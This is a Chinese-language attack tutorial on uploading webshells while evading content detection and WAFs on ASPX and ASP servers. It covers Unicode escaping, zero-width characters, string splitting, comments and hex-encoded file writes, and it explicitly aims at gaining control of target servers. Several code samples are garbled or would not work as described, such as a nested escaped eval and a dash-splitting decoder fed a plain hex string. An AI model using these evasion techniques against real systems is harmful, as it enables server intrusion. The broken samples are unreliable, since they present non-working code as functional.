### 前言
在攻防演练中，当我们发现某个上传接口时，通常会按以下步骤进行测试：
1. 检查文件后缀是否有限制。
2. 测试上传的文件是否能被解析。
3. 确认即将上传的WebShell内容是否会被拦截。

本文将重点讨论如何绕过对WebShell内容的拦截，并提供针对ASPX和ASP类型的详细方法，希望能为读者提供参考。

### 一、ASPX类型
对于ASPX类型的WebShell，可以通过以下几种方式来绕过检测：

#### 1. Unicode编码
例如，“eval”可以编码为`\u0065\u0076\u0061\u006C`。需要注意的是，在JScript中不支持大U和多个零的增加，但在C#中则可以支持。

示例：
```csharp
eval(\u0065\u0076\u0061\u006C("alert(1)"));
```

#### 2. 空字符串连接
在ASPX中，可以使用Unicode中的零宽连字符（如`\u200c`、`\u200d`等）或零宽不折行空格（如`\ufeff`、`\u202a`等）插入到脚本中，而不影响其执行。

示例：
```csharp
eval(\u0065\u0076\u0061\u006C"(\u200calert(1)\u200d)");
```

#### 3. 字符串截断
将整个字符串与函数利用多个空字符串进行分割。

示例：
```csharp
e""v""a""l("alert(1)");
```

#### 4. 头部免杀
某些字段可以放在脚本的后面，而不是前面。

示例：
```csharp
"alert(1)" + eval;
```

#### 5. 使用特殊符号
可以在脚本中添加`@`符号，而不会影响其解析。

示例：
```csharp
@eval("alert(1)");
```

#### 6. 注释插入
在脚本中插入注释以混淆代码。

示例：
```csharp
// 这是一条注释
eval("alert(1)");
```

#### 7. 花括号和分号
在语法结束的地方可以添加大量的花括号和分号，以混淆代码。

示例：
```csharp
eval("alert(1)");;;;;;;;;;;;;;;;;;;;;;
```

#### 8. 其他声明标签
在PHP中，可以使用XML标记风格、脚本风格、简短标记风格或ASP标记风格。同样，ASPX也支持类似的标签风格。

#### 9. 换行特性
利用换行符来混淆代码。

示例：
```csharp
eval
(
"alert(1)"
);
```

#### 10. C# 的 `///` 特性和 XML
C# 中的 `///` 可以作为XML注释，结合换行和Unicode特性进行混淆。

示例：
```csharp
///
eval("alert(1)");
```

通过上述方法，可以对冰蝎马等WebShell进行免杀处理。同理，其他类型的WebShell也可以采用类似的方法。

### 二、ASP类型
对于ASP类型的WebShell，可以通过变量赋值替换和组合换行的方式进行免杀。

#### 示例
常见的“一句话”木马可以通过变量赋值替换来免杀D盾。

示例：
```asp
<%
Set fso = CreateObject("Scripting.FileSystemObject")
fso.OpenTextFile(Server.MapPath("TypeError.asp"), 2, True).WriteLine(JXMD(HexToStr("3c25726573706f6e73652e7772697465282268656c6c6f2229253e")))
%>
```

其中，定义了两个函数用于混淆：

```asp
Function JXMD(MM)
    MM = Split(MM, "-")
    For x = 0 To UBound(MM)
        JXMD = JXMD & Chr(MM(x))
    Next
End Function

Function HexToStr(ByRef strHex)
    Dim Length, Max, Str
    Max = Len(strHex)
    For Length = 1 To Max Step 2
        Str = Str & Chr("&h" & Mid(strHex, Length, 2))
    Next
    HexToStr = Str
End Function
```

通过这种方式，可以绕过WAF往目标服务器写入WebShell，从而获取服务器权限。同理，ASPX类型的WebShell也可以采用类似的方法尝试绕过WAF。